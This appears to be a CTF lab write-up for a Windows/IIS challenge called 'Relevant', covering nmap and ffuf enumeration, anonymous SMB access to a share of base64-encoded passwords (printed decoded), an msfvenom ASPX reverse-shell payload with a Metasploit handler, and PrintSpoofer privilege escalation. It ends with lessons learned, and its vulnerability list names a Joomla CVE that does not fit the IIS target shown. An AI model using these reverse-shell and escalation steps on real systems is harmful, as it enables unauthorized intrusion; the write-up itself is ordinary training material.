---
description: Penetration Testing Challenge
---

# Relevant

## Reconnaissance

As always i ran nmap to list open ports.

`sudo nmap -sC -sV -O -oN nmap/scan <IP>`

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oN**: output normal format and store in file nmap/scan

I get back the following result showing that these ports are open:

* **Port 80**: running Microsoft IIS httpd 10.0
* **Port 135**: running Microsoft Windows RPC
* **Port 139**: running netbios
* **Port 445**: running Windows Server 2016 Standard Evaluation 14396
* **Port 3389**: running Microsoft Terminal Services

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

In the meanwile i start an other scan but with all ports and parralel i will run dirbuster to get directories on the Webserver.

&#x20;

`sudo nmap -sC -sV -O -p- -oN nmap/scan <IP>`

* **-p-**: scan all ports

<figure><img src="../../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

There are 3 new ports:

* **Port 49663**: runns Microsoft IIS httpd 10.0
* **Ports 49667** and **49669**: are running Microsoft Windows RCP

<figure><img src="../../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

## Enumeration

I have to run dirbuster also on port 49663 as a reminder.

First i run dirbuster on port 80.

<figure><img src="../../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

I found no directories on port 80.

So i tried port 49663 with ffuf instead of dirbuster just to use an other tool and i get the nt4wrksv directory.

<figure><img src="../../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

**Ports 139 and 445 Samba2**

Running smbclient with no password to list the services:&#x20;

`smbclient -L <IP>`

<figure><img src="../../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

So i try smbclient without a password.

`smbclient \\\\<IP>\\nt4wrksv`

<figure><img src="../../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Getting the `passwords.txt`

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

That looks like base64 encoded. So i decoded the strings with base64:

`echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d`

`Bob - !P@$$W0rD!123`

`echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d`

`Bill - Juw4nnaM4n420696969!$$$`

With ffuf i found the `nt4wrksv` directory so i can also check the path within the `passwords.txt` to proof that it exists on the server.

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

To guarantee that this is the same directory as the shared folder i uploaded a test text file from my local machine to the shared folder and opened it in the browser (no screenshot available).

## Exploitation #1 ASPX (Reverse shell)

Setup the reverse shell with msfvenom:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -f aspx > shell.aspx`

<figure><img src="../../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

**Doing it the msfconsole way**

As always start msfconsole -q and use the following settings:

`use exploit/multi/handler`

`set payload windows/x64/shell_reverse_tcp`

`set lhost 10.11.64.28`

`run`

call the .aspx file from the browser&#x20;

**Internal reconnaissance**

<figure><img src="../../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

As in the screenshot shown above there is SeImpersonatePrivilege enabled.

Running post exploitation to get an upgraded shell.

Background the current shell.

`sessions -u 1`

getting the PrintSpoofer64.exe from [https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases) and upload it to the victim:

<figure><img src="../../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

## Privilege escalation (**msfconsole)**

<figure><img src="../../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

**Doing it the netcat way**

Starting the netcat listener on port 4444 and calling the shell over the browser gives the access to bobs account.

<figure><img src="../../../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Changing the directory to c:\inetpub\wwwroot to upload the PrintSpooferx64.exe.

<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

That has failed. So i try it with the samba share.

<figure><img src="../../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

## Privilege escalation (**netcat)**

<figure><img src="../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

## Discovered vulnerabilities

1. Deprecated joomla version (CVE 2017-8917)
2. CWE-521: Weak Password Requirements
3. CWE-257: Storing Passwords in a Recoverable Format
4. CWE-269: Improper Privilege Management
5. CWE-250: Execution with Unnecessary Privileges

## Lessons learned

1. Never store passwords unprotected on the system. I mean store passwords in a passwordmanager instead of in a file.
2. Never use weak passwords
3. Don't use the same shared folder on the system as for the webserver.
4. Bob is a local administrator on the computer. He has too much privileges enabled. disable not used privileges like SeImpersonatePrivilege

